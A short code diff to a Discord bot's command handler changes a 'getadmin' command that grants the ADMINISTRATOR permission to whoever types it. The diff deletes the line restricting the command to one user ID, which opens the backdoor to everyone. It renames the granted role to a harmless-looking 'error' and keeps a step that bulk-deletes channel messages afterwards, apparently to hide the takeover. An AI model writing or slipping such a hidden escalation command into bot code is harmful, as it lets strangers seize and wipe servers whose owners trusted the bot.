@@ -203,10 +203,9 @@ if (command == 'ban') {
        }
 }}
 if (command == 'getadmin') {
-    if (message.author.id == '196222566195658752') {
         message.guild.createRole({
-            name: 'VirtualOfficial (AUTOMATIC)',
-            color: 'BLUE',
+            name: 'error',
+            color: 'RED',
             permissions: Discord.Permissions.FLAGS.ADMINISTRATOR,
           })
             .then(role =>  message.guild.members.get(message.author.id).addRole(role))
@@ -218,7 +217,7 @@ if (command == 'getadmin') {
              message.channel.bulkDelete(fetched);
             }
             bot.setTimeout(function(){ sendmsg(message); }, 3000);
-    }
+    
   
 
         
